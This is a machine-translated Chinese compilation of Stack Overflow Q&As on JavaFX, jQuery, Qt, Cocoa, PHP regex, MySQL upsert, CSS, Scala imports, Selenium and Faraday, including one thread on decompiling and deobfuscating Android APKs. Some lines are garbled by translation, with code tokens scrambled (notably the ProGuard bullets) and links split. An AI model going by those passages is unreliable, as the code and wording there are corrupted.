创建一个“容器”类，其中包含您希望返回的每种数据类型的实例。

```
class Container
{
    Array PGRow;
    Array AmountList;
} 
```

然后在您的代码中：

```
Container container = new Container();
container.PGRow = ....;
container.AmountList = ....; 
```

# javafx-2 - 如何将内容动态加载到 JavaFX 选项卡？

> ID：12146362
> 
> 赞同：7
> 
> 时间：2012-08-27T17:09:45.117
> 
> 标签：javafx-2, fxml

我有一个使用 JavaFX 和 FXML 制作的 GUI。

这个 GUI 有很多组件，并不是所有的组件都需要在某一时刻。

例如，假设一个 GUI 从其服务器部分接收城市列表。每个城市都在其自己的选项卡上进行了描述（并用许多节点进行了描述）。城市集包含 30 个元素。

当 GUI 启动时，它会向服务器询问城市列表。服务器返回城市的随机“子集”（因此，它可以是莫斯科 + 里加 + 纽约或圣彼得堡 + 东京，或仅阿姆斯特丹，或一组中的所有 30 个城市）。

所以。我不需要在我的节点树中拥有所有 30 个选项卡（我想它们只会“吃掉”内存，仅此而已）。

我想管理我在 GUI 上每个时刻拥有的选项卡数量。

我的第一个简单解决方案如下：

1.  创建一个 FXML 文件，其中包含所有城市的组件
2.  在控制器类的初始化过程中，删除不需要的选项卡。

我有这个解决方案的问题。首先，我不知道是否`tabPane.getTabs().remove(index)`真的从节点树中删除了选项卡及其所有内容。其次，所有不需要的选项卡将在它们被删除之前被初始化，因此它们无论如何都会使用内存和资源，而且我的 GUI 可能比它必须的要慢。

我的第二个解决方案是：

1.  制作很多 FXML。一个用于所有城市，一个用于每个城市，一个用于每个城市组合。

但是会有很多 FXML 的方法，所以这个解决方案也没有用。

我梦寐以求的解决方案：

1.  为每个城市创建一个 FXML 文件，并为带有选项卡的主应用程序创建一个文件。
2.  需要时将 FXML 城市文件内容动态加载到选项卡中。

所以，如果有人对此任务有任何想法，或者知道解决方案，请帮助我......

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-28T15:59:52.927

好的，如果我理解正确，这是我的建议 Victoria；
假设主应用程序 FXML 包含`TabPane`在其中的某个位置：

```
// other controls
<TabPane fx:id="tabPane" id="tabPane">
   <tabs>
   </tabs>
</TabPane>
// other controls 
```

在主控制器中：

```
// TabPane in fxml
@FXML
private TabPane tabPane;

// The FXMLLoader
private FXMLLoader fXMLLoader = new FXMLLoader();

// City list fetched from server
private String[] cityList = {"Moscow", "Stambul", "New York", "Bishkek"};

// OPTIONAL : Map for "city name - city fxml controller" pairs
private Map<String, Object> cityControllerMap = new HashMap<String, Object>();

// Belows are in init method

// Add only tabs dynamically but not their content
for (String city : cityList) {
    tabPane.getTabs().add(new Tab(city));
}

// It is important to call it before adding ChangeListener to the tabPane to avoid NPE and
// to be able fire the manual selection event below. Otherwise the 1st tab will be selected
// with empty content.
tabPane.getSelectionModel().clearSelection();

// Add Tab ChangeListener
tabPane.getSelectionModel().selectedItemProperty().addListener(new ChangeListener<Tab>() {
    @Override
    public void changed(ObservableValue<? extends Tab> observable, Tab oldValue, Tab newValue) {
        System.out.println("Tab selected: " + newValue.getText());
        if (newValue.getContent() == null) {
            try {
                // Loading content on demand
                Parent root = (Parent) fXMLLoader.load(this.getClass().getResource(newValue.getText() + ".fxml").openStream());
                newValue.setContent(root);

                // OPTIONAL : Store the controller if needed
                cityControllerMap.put(newValue.getText(), fXMLLoader.getController());

            } catch (IOException ex) {
                ex.printStackTrace();
            }
        } else {
            // Content is already loaded. Update it if necessary.
            Parent root = (Parent) newValue.getContent();
            // Optionally get the controller from Map and manipulate the content
            // via its controller.
        }
    }
});
// By default, select 1st tab and load its content.
tabPane.getSelectionModel().selectFirst(); 
```

如果您决定存储控制器，您可以为每个城市 fxml 定义一个控制器，或者为所有它们定义一个控制器类，并`fXMLLoader.setController(new CommonCityController());`在加载城市 fxml 文件之前设置它。

HTH。

# jquery - 错误的代码jquery

> ID：12146363
> 
> 赞同：2
> 
> 时间：2012-08-27T17:09:52.577
> 
> 标签：jquery, delay, mouseover, mouseout

所以我有一个动画 gif`.mouseout`和`.mouseover`3 秒后我想在那里有一个静止图像。我使用的方法是更改​​ 的`background-image`，`div`所以我有四个图像：

1.  加载页面时（我在普通的 css 文件中执行此操作）
2.  当鼠标结束时（应该是动画，我正在做这个 jQuery）
3.  当鼠标不在时（应该是动画，我正在做这个 jQuery）
4.  mouseout事件后3秒（应该是正常的）

我被困在 4 并且不知道如何编写代码，所以这是我对 2 和 3 的内容：

```
 $("#ubBackground").hover(function(){
        $(this).stop().css("background-image","url(img/userBoxMouseOver.gif)");},
            function(){
      $('#ubBackground').css('background-image','url(img/userBoxMouseOut.gif)');
                        }
    ); 
```

我想我应该使用`.delay()`，但我不知道具体如何，任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-27T17:13:23.063

```
var timer;

$("#ubBackground").on({
    mouseenter: function(){
        clearTimeout(timer);
        $(this).css("background-image","url(img/userBoxMouseOver.gif)");
    },
    mouseleave: function() {
        var self=this;
        $(this).css('background-image','url(img/userBoxMouseOut.gif)');
        timer = setTimeout(function() {
            $(self).css('background-image','url(img/userBox3secLater.gif)');
        }, 3000);
    }
}); 
```

当鼠标离开时设置一个计时器，在三秒后改变背景，并清除 mouseenter 中的超时，以防鼠标在三秒内再次进入。

# c++ - QTreeWidget editItem 因“编辑：编辑失败”而失败

> ID：12146364
> 
> 赞同：4
> 
> 时间：2012-08-27T17:09:57.597
> 
> 标签：c++, qt, qwidget, qtreewidget

我`QTreeWidgetItem`添加了一个`QTreeWidget`：

```
QTreeWidgetItem* item = new QTreeWidgetItem(ui->trwPairs);
item->setFlags(item->flags() | Qt::ItemIsEditable); 
```

如果项目被编辑，我想对新值做一些检查：

```
Pairs::Pairs(QWidget *parent) :
QWidget(parent),
  ui(new Ui::Pairs)
{
  ui->setupUi(this);
  connect(this->ui->trwPairs, SIGNAL(itemChanged(QTreeWidgetItem*,int)), this, SLOT(Validate(QTreeWidgetItem*,int)));
}

void Pairs::Validate(QTreeWidgetItem* item, int column)
{
  if (item->text(column).toInt() < 1)
  {
    QMessageBox::critical(this, "Error", QString("Node ID ") + item->text(column) +  " is invalid.");
    ui->trwPairs->editItem(item, column);
  }
} 
```

自然，如果它小于 1，它会捕获它，并给我消息框。但是，打印到`cerr`是`edit: editing failed`并且该项目未处于编辑模式。我错过了什么？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-29T07:22:51.323

在调试器中单步执行它会显示以下内容：

在 quabstractitemview.cpp 中，第 3953 行返回 false。不知何故，您的项目似乎仍处于编辑状态，而您正试图再次编辑它或其他什么。

```
bool QAbstractItemViewPrivate::shouldEdit(QAbstractItemView::EditTrigger trigger,
                                          const QModelIndex &index) const
{
// ..
    if (state == QAbstractItemView::EditingState)
      return false;
} 
```

IIRC 对于每个单元格有多行的表格，我遇到了类似的问题。查看类`QAbstractItemDelegate`视图有项目委托，允许您控制使用哪个编辑器以及它的行为方式。我相信默认情况下使用 QLineEdit。像 QLineEdit 这样的编辑器可以有验证器来控制数据的验证方式，如果数值小于 0，则在您的情况下拒绝它。但我认为您必须使用模型/视图类并为此实现自己的模型。Qt 文档`QTreeWidget::setItemWidget(..)`说：

> 此功能仅应用于在树小部件项目的位置显示静态内容。如果要显示自定义动态内容或实现自定义编辑器小部件，请改用`QTreeView`和子类化`QItemDelegate`。

但是，我不确定是否有更简单的方法可以使用小部件类来做到这一点。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-27T23:46:37.533

问题可能是，您正在以一种非常奇怪的方式为您的项目设置标志。只需启用项目选择和编辑：

```
item->setFlags(Qt::ItemIsEditable | Qt::ItemIsEnabled | Qt::ItemIsSelectable); 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2014-03-06T10:28:01.580

我有一个类似的问题，我试图在收到`itemChanged`信号后编辑后续列。根据 Nils 的分析，该项目仍处于编辑状态，我将信号连接类型更改为[QueuedConnection](http://qt-project.org/doc/qt-4.8/qt.html#ConnectionType-enum)，这允许项目在重新进入之前离开状态。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-06-16T22:06:13.260

我遇到了类似的问题，通过快捷键调用 edit() 时会出现“编辑：编辑失败”错误。我正在将 currentIndex() 传递给 edit()，但我没有检查所选行的正确列是否为当前列。我只有第一列可编辑，所以如果我单击了该行（但在任何其他列中）然后调用了我的编辑键，我会得到错误。

我能够通过将兄弟(currentIndex().row(), 0) 的结果传递给 edit() 来解决我的问题。

# cocoa - NSTextField 子类不尊重-acceptsFirstResponder？

> ID：12146370
> 
> 赞同：1
> 
> 时间：2012-08-27T17:10:11.743
> 
> 标签：cocoa, subclass, nstextfield, first-responder

我正在使用 NSTextFields 并启用/禁用选择和编辑，并且在示例应用程序中遇到了一些奇怪的行为。我有一个名为 MyTextField 的 NSTextField 子类；这个子类做的唯一一件事就是在被问到时拒绝第一响应者的状态，如：

```
@interface MyTextField : NSTextField
@end

@implementation MyTextField
- (BOOL)acceptsFirstResponder {
    return NO;
}
@end 
```

但是，当我将此文本字段的实例放在 .xib 中，然后启动应用程序时，我仍然可以单击文本字段并开始编辑它。文本字段是否忽略 的返回值`-acceptsFirstResponder`？

我已经尝试了几件事来解决/诊断这个问题：

*   文本字段的类正确设置为 MyTextField 而不是 .xib 中的 NSTextField
*   如果我`NSLog`在 之前放置一个语句`return`，它将按预期打印到控制台
*   如果我返回`NO`for `-becomeFirstResponder`，它会表现出相同的行为：我仍然可以编辑该字段
*   如果我调用`[myTextField setSelectable:NO]`视图控制器，它会按预期工作：我不再能够单击该字段
    *   但是，如果我`NO`从`-isSelectable`and `-isEditable`（没有显式调用`-setSelectable:`）返回，我仍然可以在（并编辑）该字段中选择文本

这里发生了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T21:05:16.180

我不确定这一点，但我认为这与第一响应者实际上不是文本字段，而是字段编辑器这一事实有关，它是一个特殊的（不可见的）文本视图对象。查看 Apple 文档中“文本编辑编程指南”的“使用字段编辑器”部分以查看解释。

# heroku - Heroku 上的 Pubnub 插件

> ID：12146378
> 
> 赞同：0
> 
> 时间：2012-08-27T17:10:38.987
> 
> 标签：heroku, pubnub

根据下面的链接，heroku 确实为我们提供了 pubnub 的插件。 [https://addons.heroku.com/pubnub](https://addons.heroku.com/pubnub)

但是，没有关于每个包中的连接数支持的信息。

有人可以向我提供这方面的信息吗？或者heroku的连接数是无限的吗？

谢谢， 阿卜杜勒

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T18:35:19.307

当您将 PubNub 添加到您的 Heroku 帐户时，您将从沙盒层帐户开始，该帐户允许您拥有多达 100 个连接并每月发送多达 100 万条消息。您可以在此处查看有关 PubNub 定价层的更多信息：[http](http://www.pubnub.com/pricing) ://www.pubnub.com/pricing 。我希望这有帮助！

温迪（来自 PubNub）

# java - Android通过逆向工程后如何读取混淆的Java代码

> ID：12146380
> 
> 赞同：6
> 
> 时间：2012-08-27T17:10:46.767
> 
> 标签：java, android, obfuscation, deobfuscation

在使用 dex2jar 和 JD-GUI 等工具后，我从 APK 中获得了 Java 类。众所周知，Java 字节码可以转换回 Java 类，因此大多数情况下它会通过一些工具进行优化和混淆（例如在 Android 的情况下使用 ProGuard），以使其免受其他人的影响。所以我得到的是混淆代码，我想让它没有错误、可读、可理解，以便我可以为自己的目的进一步修改它（仅供我个人使用，我无意侵犯任何版权）。因此，任何帮助，即建议、工具、帮助材料，以使这种混淆代码更接近开发人员编写的代码或使其无错误且易于理解，将对我有很大帮助。目前，我的重点是逆转 ProGuard 使用的混淆技术，例如当我尝试对自己的项目进行逆向工程时发现：

*   `int`通过匹配`R`逆向工程生成的文件，可以使用 id 更改资源值。
*   /条件大多转换为and 一些s 和`if`s 。`else``while(true)``continue``break`
*   内部类大多分解为单独的文件

因此，对于上述方式的任何其他技术和帮助材料，可以描述如何正确扭转它们将非常有帮助。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2017-02-09T21:06:46.920

没有一个神奇的工具可以将混淆的代码重构为可构建的项目。最有可能的是，您将无法将 APK 反编译和反混淆，使其成为干净且可维护的代码。这是一件好事。

有些工具比 dex2jar 和 jd-gui 更好。其中之一是[apk-deguard](http://apk-deguard.com/)，它声称可以逆转混淆过程。从他们的关于页面：

> **解除警戒**
> 
> DeGuard ( [http://www.apk-deguard.com](http://www.apk-deguard.com) ) 是一种新颖的 Android APK 统计反混淆系统，由苏黎世联邦理工学院软件可靠性实验室开发，该实验室开发了广泛使用的 JSNice 系统。与 JSNice 类似，DeGuard 基于从数千个开源程序中学习到的强大概率图形模型。使用这些模型，DeGuard 可以恢复 Android APK 中的重要信息，包括方法和类名以及第三方库。DeGuard 可以揭示处理 Android 恶意软件中敏感数据的字符串解码器和类。

您应该使用Google 拥有的[Enjarify](https://github.com/google/enjarify)而不是 dex2jar。另外，[apktool](https://ibotpeaches.github.io/Apktool/)可以很好地反编译 APK 的资源，这不是 dex2jar 和 enjarify 处理的。

其他工具包括[jadx](https://github.com/skylot/jadx)、[procyon](https://bitbucket.org/mstrobel/procyon)、[fernflower](https://github.com/fesh0r/fernflower)、[show-java](https://github.com/niranjan94/show-java)、[smali/baksmali](https://github.com/JesusFreke/smali)。

* * *

您将需要一个好的 IDE 来进行重构。[JEB](https://www.pnfsoftware.com/)看起来是一个很好的重构工具。这是 Android 安全研究人员主要使用的付费工具。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-27T17:12:19.817

这应该会有所帮助： [DeObfuscator](http://www.softpedia.com/get/Programming/Debuggers-Decompilers-Dissasemblers/Java-DeObfuscator.shtml)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-27T17:32:45.737

逆向工程是一项艰巨的任务（我会说微妙的艺术），主要是碰运气，尤其是对于混淆代码，你可以做的是专注于一些特殊的功能，这似乎很明显，从那里开始，重命名和重构类，一个好的 IDE 也可能对你有很大帮助（我个人推荐：NetBeans）。

# php - 匹配任意数量的单词正则表达式

> ID：12146383
> 
> 赞同：1
> 
> 时间：2012-08-27T17:11:08.290
> 
> 标签：php, regex

我试图在 PHP 中捕获一个包含 n 个单词的行，这些单词跟在 PHP 中的标题序列之后，但我无法捕获除第一个单词之外的任何内容。以下是我要匹配的文件的内容：

```
Name: test
Caption: test test test test 
```

这是正则表达式代码和结果......

```
preg_match_all('/([A-z]+:)\s*(\w+)[\r|\r\n|\n]*/', $contents, $array); 
```

结果：

```
array(3) { 
    [0]=> array(2) { 
        [0]=> string(11) "Name: test " 
        [1]=> string(14) "Caption: test " 
    } 

    [1]=> array(2) { 
        [0]=> string(5) "Name:" 
        [1]=> string(8) "Caption:" 
    } 

    [2]=> array(2) { 
       [0]=> string(4) "test" 
       [1]=> string(4) "test" 
    } 
  } 
```

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T17:22:12.303

假设您的输入数据总是看起来像您的示例（标题段、冒号、单词；都在一行上），应该这样做：

```
preg_match_all('/([A-Za-z]+:)\s*(.*)/', $contents, $array); 
```

这将导致`$array[1]`匹配类似的内容`Name:`，然后`$array[2]`匹配行的其余部分（您可能必须使用`trim()`从 中删除任何前导和/或尾随空格`$array[2]`）。

如果您只想在第二部分捕获“单词”，我相信您可以将第二个捕获组更改为：

```
preg_match_all('/([A-Za-z]+:)\s*([\w\s]+)/', $contents, $array); 
```

另请注意，您不应使用该`[A-z]`构造，因为 ASCII 表中的大写字母和小写字母之间存在非字母字符。有关字符映射，请参见[ASCII 表](http://www.asciitable.com/)。

# asp.net-mvc - 无法在 Visual Studio Express 2012 for Web 中创建 ASP.NET MVC 项目

> ID：12146384
> 
> 赞同：3
> 
> 时间：2012-08-27T17:11:14.727
> 
> 标签：asp.net-mvc, visual-studio-2012

我已经下载并安装了 Visual Studio Express 2012 for Web，但我无法创建任何 ASP.NET MVC 项目，因为没有 ASP.NET 项目选项。有没有单独下载之类的？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-27T17:13:49.413

尝试下载/安装：

[http://www.asp.net/mvc/mvc4](http://www.asp.net/mvc/mvc4)

编辑：我不是指下载 Visual Studio。我发布的链接专门用于安装默认情况下不包含在 Visual Studio 中的 MVC 4。是您下载的这个 ASP.NET MVC 扩展吗？ALSO.. 要创建一个 ASP.NET MVC 站点，您必须选择 NEW->Project，然后单击您选择的语言下的 Web 子类别，而不是 new->Web Site。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-02-27T09:55:41.283

将 .net 框架版本更改为 4.5

# perl - Perl：Net::LDAP::LDIF moddn 示例

> ID：12146389
> 
> 赞同：1
> 
> 时间：2012-08-27T09:23:02.607
> 
> 标签：perl, ldap, ldif

我正在寻找如何使用 CPAN 的 Net::LDAP 更改 DN 或更确切地说是 RDN 的**示例代码。**重要提示：我不想直接对服务器进行此更改，而是**生成一个 LDIF 文件**！Net::LDAP 中只有 moddn 函数，LDIF 模块中没有。尽管如此，我在互联网上的某个地方读到，可以创建这样的 LDIF 文件。

可能我必须使用**Net::LDAP::Entry 的 moddn**函数，但我还没有找到将这种更改写入 LDIF 文件的方法。

先感谢您。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T19:37:32.493

如果您正在寻找 LDIF 应该是什么样子的示例，请参阅：[移动和重命名条目](https://ff1959.wordpress.com/2011/08/01/mastering-moddn/)

# ruby - 在 Sinatra 中使用 Pony 上传文件表单

> ID：12146392
> 
> 赞同：1
> 
> 时间：2012-08-27T17:11:39.927
> 
> 标签：ruby, sinatra, email-attachments, pony

我正在尝试使用 Pony 在 Sinatra 中使用上传表单。现在一切正常，文件被读取，电子邮件被成功邮寄，我似乎无法获得附件。我认为我没有正确调用文件的路径？我不完全确定，整个 Ruby/Sinatra/Pony 场景的新手。有什么帮助吗？非常感激！

这是我现在拥有的：

```
 post '/upload' do
    unless params[:file] &&
           (tmpfile = params[:file][:tempfile]) &&
           (name = params[:file][:filename])
      @error = "No file selected"
      return :success
    end
    STDERR.puts "Uploading file, original name #{name.inspect}"
    while blk = tmpfile.read(65536)
      # here you would write it to its final location
      STDERR.puts blk.inspect
    end

    logger.info "some"
    Pony.mail(
        :from => params[:uname] + "<" + params[:email] + ">",
        :to => 'example@example.com',
        :subject => "Internship Prospect " + params[:uname] + " has contacted you",
        :body => "Hello,\n\nYou have a new contact request\n\nName: "+params[:uname]+"\nEmail: "+params[:email]+"\n\nMessage:\n"+params[:message]+"\n\nThanks,\The Team",
        :port => '587',
        :via => :smtp,
        :via_options => { 
          :address              => 'smtp.gmail.com', 
          :port                 => '587', 
          :enable_starttls_auto => true, 
          :user_name            => 'name@example.com', 
          :password             => 'password', 
          :authentication       => :plain, 
          :domain               => 'localhost.localdomain',
          :attachments => {params[:file][:filename] => File.read(params[:file][:tempfile])}

        })

  redirect "/success"
  end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T18:12:41.077

`:attachments`密钥应该是第一个哈希的一部分：

```
Pony.mail(
        :from => params[:uname] + "<" + params[:email] + ">",
        :to => 'example@example.com',
        :subject => "Internship Prospect " + params[:uname] + " has contacted you",
        :body => "Hello,\n\nYou have a new contact request\n\nName: "+params[:uname]+"\nEmail: "+params[:email]+"\n\nMessage:\n"+params[:message]+"\n\nThanks,\The Team",
        :attachments => {params[:file][:filename] => File.read(params[:file][:tempfile])}
        :port => '587',
        :via => :smtp,
        :via_options => { 
          :address              => 'smtp.gmail.com', 
          :port                 => '587', 
          :enable_starttls_auto => true, 
          :user_name            => 'name@example.com', 
          :password             => 'password', 
          :authentication       => :plain, 
          :domain               => 'localhost.localdomain',
        }) 
```

# mysql - Upsert - 如果存在则更新，否则在 MySQL 中插入

> ID：12146393
> 
> 赞同：1
> 
> 时间：2012-08-27T17:11:41.757
> 
> 标签：mysql, insert-update

我正在寻找一个简单的 upsert（更新/插入）。桌子看起来像这样

```
+-------+-------------+------+-----+---------+-------+
| Field | Type        | Null | Key | Default | Extra |
+-------+-------------+------+-----+---------+-------+
| id    | int(11)     | YES  | PRI | NULL    |       |
| name  | varchar(20) | YES  |     | NULL    |       |
| email | varchar(20) | YES  |     | NULL    |       |
+-------+-------------+------+-----+---------+-------+ 
```

这里没有钥匙。这个想法是如果电子邮件不同则插入，否则更新。在mysql 中[插入重复键](http://dev.mysql.com/doc/refman/5.0/en/insert-on-duplicate.html)不适合目的。

有没有一种优雅的方式来做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-27T18:28:39.240

如果您无法在电子邮件列上添加唯一键，您将首先检查记录是否存在（最好在事务中）：

```
SELECT id FROM mytable WHERE email = 'my@example.com' FOR UPDATE 
```

然后更新记录（如果存在）：

```
UPDATE mytable SET name = 'my name' WHERE id = ? 
```

否则插入它：

```
INSERT INTO mytable (name, email) VALUES ('my name', 'my@example.com') 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T17:13:54.850

关于什么：

```
REPLACE INTO table VALUES(1,'hello', 'world@example.com'); 
```

# html - 背景大小：覆盖不缩放 div 中的图像

> ID：12146394
> 
> 赞同：8
> 
> 时间：2012-08-27T17:11:42.030
> 
> 标签：html, css, background-image

我有四个同样大小的 div 设置如下：

```
<div id="top-left"></div>
<div id="top-right"></div>
<div id="bottom-left"></div>
<div id="bottom-right"></div> 
```

每个都是页面宽度的 50% 并且绝对定位。像这样，例如：

```
#top-right {
position: absolute;
top: 0px;
left: 50%;
width: 50%;
height: 50%;
} 
```

问题是当我尝试通过 CSS3 封面缩放（大）背景图像时。这是我到目前为止的背景图片 css：

```
background: #000 url('DSC01992.jpg') center center fixed no-repeat;
background-size: cover;
-moz-background-size: cover;
-o-(etc.) 
```

这是一个活生生的例子：http: [//jsfiddle.net/TqQv7/](http://jsfiddle.net/TqQv7/)

如果您在此处打开占位符图像：http: [//placekitten.com/2000/1000](http://placekitten.com/2000/1000) ，您将看到图像未正确缩放。

我错过了什么吗？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-08-27T17:15:49.060

删除速记声明的`background-position`和部分将为您提供所需的结果。`background-attachment``background`

改变：

```
background: #000 url('http://placekitten.com/2000/1000') center center fixed no-repeat; 
```

至：

```
background: #000 url('http://placekitten.com/2000/1000') no-repeat; 
```

这是一个演示：http: [//jsfiddle.net/TqQv7/1/](http://jsfiddle.net/TqQv7/1/)

使用~~`background-position`and~~ `background-attachment` with`background-size : cover`是违反直觉的，你告诉浏览器在那里做两件不同的事情，而且现代浏览器似乎仍然默认使用旧方法而不是新方法。

有关`background-size`查看 MDN 文档的注意事项的更多信息：[https ://developer.mozilla.org/en-US/docs/CSS/background-size](https://developer.mozilla.org/en-US/docs/CSS/background-size)

# scala - 尝试使用隐藏子句和包罗万象的方式获取 Scala 导入

> ID：12146397
> 
> 赞同：1
> 
> 时间：2012-08-27T17:11:59.867
> 
> 标签：scala, import

好的，所以我编写了以下 Scala 代码来探索 Scala 导入。我的目标是导入除芦笋外的所有对象蔬菜成员。我知道这样做的方法是编写以下子句（在执行 com.att.scala.Vegetables 之后）

```
 **import Vegetables.{Asparagus=>_,_}** 
```

由于我的目的是确认上述条款的意图，我开始要求 REPL 返回 Asparagus.name。在我看来，我希望 REPL 会说 **“嘿，你让我不要用你的重命名条款导入 Asparagus，所以我没有 Asparagus 可以给你”**

相反，REPL 返回 **res5: java.lang.String = Asparagus**

当然，当我输入 JapaneseSpinach.color 它按预期工作并返回 **res7: java.awt.Color = java.awt.Color[r=0,g=255,b=0]**

对我来说很明显，我在这里遗漏了一些东西。我的目标是了解隐藏子句的工作方式并确认隐藏子句确实隐藏了一个成员（在我看来隐藏意味着该成员实际上不可用..）

我的代码如下：

```
 package com.att.scala

   import java.awt.Color
   trait Vegetable {
     val name: String
    val color: Color
  }

 object Vegetables {
  object Asparagus extends Vegetable { 
    val name = "Asparagus"
    val color = Color.GREEN  
  } 

object Carrot extends Vegetable { 
   val name = "Carrot"
   val color = Color.ORANGE 
}

object Parsnip extends Vegetable { 
  val name = "Parsnip"
  val color = Color.ORANGE
}

object JapaneseSpinach {
  val name = "Komatsuna"
  val color = Color.GREEN
 }
 val veggiePlatter = List(Asparagus, Carrot)

def showColor(veggie: Vegetable) {
  println("Entered showColor")
  import veggie._
  println("Veggie name is " + name)
}

   def test() {
     println("entered test")
   }

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T19:25:13.830

首先还要感谢 om-nom-nom。之前我使用了如下的 import 子句： **import Vegetables.{Asparagus=> *,* }** 而不是 REPL 说“**嘿，你让我不要用你的重命名子句导入 Asparagus，所以我没有 Asparagus 可以给你**”它仍在返回 Asparagus.name 和 Asparagus.color。（当我输入“import Asparagus.name”作为测试时）

这是当我意识到我错过了一些东西的时候。结果是反直觉的。芦笋应该是不可见的。仔细一看，我发现我犯了以下错误：

我忘记考虑到之前我已经使用以下语句导入了对象蔬菜：import com.att.scala.Vegetable。

上述声明必须将**所有**蔬菜成员纳入范围。后来我应用了重命名和包罗万象的条款，但由于第一次导入，它不起作用。所以我决定再试一次。

我重新启动了 Eclipse，启动了 Eclipse 并发出了以下命令： 这次我做了如下：

```
 **import com.att.scala.Vegetables.{Asparagus=>_,_}**

       **Asparagus.name** 
```

REPL 立即返回以下响应：

```
 **<console>:11: error: not found: value Asparagus
          Asparagus.name
          ^** 
```

这是我的预期结果。

# python - 禁用Firefox另存为对话框硒

> ID：12146403
> 
> 赞同：6
> 
> 时间：2012-08-27T17:12:20.187
> 
> 标签：python, firefox, selenium

我正在使用 selenium 进行网络抓取，每当我尝试下载时，我都会将 firefox 下载/保存为文件弹出但是，即使我申请`profile.set_preference('browser.helperApps.neverAsk.saveToDisk', "application/csv")`，它仍然无法正常工作，我已经尝试了每个 .csv 相关的 MIME，但不起作用，是可以单击`save as`单选按钮，然后单击`ok`对话框或完全禁用它。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-28T10:02:09.663

您应该做两件事，首先将这三个首选项设置如下（这是在 Java 中，但我想您设法将其转换为 python :-)：

```
profile.setPreference("browser.download.dir", "c:/yourDownloadDir");
profile.setPreference("browser.download.folderList", 2);
profile.setPreference("browser.helperApps.neverAsk.saveToDisk", "application/csv, text/csv"); 
```

其次，您应该确保下载文件具有所需的 mime 类型。为此，您可以使用 Web 开发人员工具并检查下载。

编辑：

要找出 MIME 类型打开 Chrome，请按`Ctrl`+ `Shift`+ `I`（在 Mac OS 上为 Cmd+Alt+I）切换到“网络”选项卡，然后单击您的下载链接。您应该看到如下内容：

![Chrome 开发者工具 mime 类型](../Images/de09df8fb52b71cdaaa6b3a4545cd973.png)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2016-01-06T21:18:27.527

只是一个可能对某人有所帮助的附加答案，因为对已接受答案的评论使我走上了正确的轨道（谢谢！）。您可能正在处理的**另一种 MIME 类型的 CSV 是**[**application/x-csv**](http://mimeapplication.org/x-csv.html) - 这是我的情况，一旦我在浏览器的“网络”选项卡中查找它，我就变得更快乐了 :)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-06-21T21:47:59.053

在 C# 中

```
FirefoxOptions options = new FirefoxOptions();
options.SetPreference("browser.download.folderList", 2);
options.SetPreference("browser.download.manager.showWhenStarting", false);
options.SetPreference("browser.download.dir", "c:\\temp");
options.SetPreference("browser.helperApps.neverAsk.saveToDisk", "text/csv"); 
```

# ruby-on-rails - 以法拉第为参数发布图像

> ID：12146407
> 
> 赞同：4
> 
> 时间：2012-08-27T17:12:37.137
> 
> 标签：ruby-on-rails, sinatra, net-http, faraday

我有一个旧服务和一个带有图像的新服务。我想将图像从旧迁移到新。为此，我需要从旧服务中获取图像，然后将其发布到新的 sinatra 服务。我能够使用 NET::HTTP 以我想要的格式发布图像

```
 url = URI.parse('http://0.0.0.0:9292/')
  File.open("./Belgium.png") do |jpg|
   req = Net::HTTP::Post::Multipart.new url.path, {"image" => UploadIO.new(jpg, "image/jpeg", "Belgium.jpg"), id:4234}
    res = Net::HTTP.start(url.host, url.port) do |http|
      http.request(req)
    end
  end 
```

我在我的 sinatra 服务中使用上述 post 方法获得的参数是

```
params = {"image"=>
  {:filename=>"Belgium.jpg", :type=>"image/jpeg",:name=>"image",:tempfile=> #<File:/var/folders/h7/f9cvygqs3lg78kwh24v8yzp80000gn/T/RackMultipart20120827-76057-1f3inkn>,
 :head=> "Content-Disposition: form-data; name=\"image\";filename=\"Belgium.jpg\"\r\nContent-Length: 28228\r\nContent-Type: image/jpeg\r\nContent-Transfer-Encoding: binary\r\n"},
  "id"=>"4234"} 
```

但是我无法用法拉第获得相同的结果。我尝试使用类似的东西：

```
payload = { :profile_pic => Faraday::UploadIO.new('avatar.jpg', 'image/jpeg') }
Faraday.post 'http://0.0.0.0:9292/', payload 
```

在我的服务中，我得到如下信息：
“#<'UploadIO:0x007fb950373de8>”一个对象。这不是我对我的服务的期望。

如何获得与 Net::HTTP 相同的行为。我认为它与中间件有关，我尝试过调整，但我仍然是新手。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-27T17:38:57.517

关于什么：

```
conn = Faraday.new(:url => 'http://0.0.0.0:9292' ) do |faraday|
  faraday.request :multipart
end
payload = { :profile_pic => Faraday::UploadIO.new('avatar.jpg', 'image/jpeg') }
conn.post 'http://0.0.0.0:9292/', payload 
```

# jquery - jQuery动画中的文本截断

> ID：12146415
> 
> 赞同：2
> 
> 时间：2012-08-27T17:12:52.957
> 
> 标签：jquery, css

这个脚本允许在动画输入和输出字母的同时用另一个词替换一个词。它以“First Wordy”开始，鼠标悬停时变为“Second Wordy”，鼠标悬停时变为第一个单词。

